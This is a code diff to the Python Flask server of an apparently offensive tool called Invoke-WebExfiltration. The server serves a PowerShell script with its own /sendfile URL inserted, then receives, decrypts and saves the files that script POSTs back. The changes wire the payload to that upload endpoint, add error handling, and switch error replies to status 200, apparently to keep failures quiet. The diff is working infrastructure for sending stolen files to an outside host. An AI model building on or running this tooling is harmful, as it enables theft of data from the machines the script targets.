@@ -15,6 +15,7 @@ import ssl
 from OpenSSL import crypto
 import os
 import shutil
+import binascii
 
 author = "Philipp Rieth"
 version = "0.2"
@@ -190,7 +191,11 @@ class IWE:
         :return: returns the file name as a string
         """
         # decode the base64 string
-        b64_decoded = base64.b64decode(aes_b64_filename)
+        try:
+            b64_decoded = base64.b64decode(aes_b64_filename)
+        except binascii.Error:
+            print("Error: could not decode base64! Something is wrong...")
+            return ""
 
         return self.__aes256_decrypt_bytes(b64_decoded).decode('utf-8')
 
@@ -271,7 +276,7 @@ def main():
 
     proto = "https" if not args.http else 'http'
     target_url = f'{proto}://{args.address}:{args.port}/'
-
+    target_url_post_req = f'{target_url}sendfile'
 
     print(f"URL:      {target_url}\n" 
           f"Password: {args.password}\n"
@@ -287,7 +292,7 @@ def main():
     iwe = IWE(password=args.password)
 
     @app.route('/sendfile', methods=['POST'])
-    def user():
+    def sendfile():
 
         try:
             content = request.get_json()
@@ -298,9 +303,9 @@ def main():
             file_full_path = iwe.aes256_decrypt_filename(content['fn'])
             plaintext_bytes = iwe.aes256_decrypt_binary(content['ct'])
         except CouldNotDecryptError:
-            return Response('Error: Could not decrypt. Wrong password?', status=400)
+            return Response('Error: Could not decrypt. Wrong password?', status=200)
         except TypeError:
-            return Response('Error: The received body looks wrong', status=400)
+            return Response('Error: The received body looks wrong', status=200)
 
         dirs = os.path.dirname(file_full_path).replace(':', '')
         filename = os.path.basename(file_full_path)
@@ -324,7 +329,7 @@ def main():
         """ Junk return for fun """
         return Response("¯\_(ツ)_/¯", status=200)
 
-    @app.route('/iwe')
+    @app.route('/iwe', methods=['GET'])
     def get_iwe_ps1():
         """
         Reads the current Invoke-WebExfiltration.ps1 file and returns it on request
@@ -333,7 +338,7 @@ def main():
         with open('Invoke-WebExfiltration.ps1', encoding="utf-8") as f:
             iwe_file = f.read()
 
-        iwe_file = iwe_file.replace('TARGET_PLACEHOLDER', target_url)
+        iwe_file = iwe_file.replace('TARGET_PLACEHOLDER', target_url_post_req)
 
         return Response(iwe_file, status=200)
 
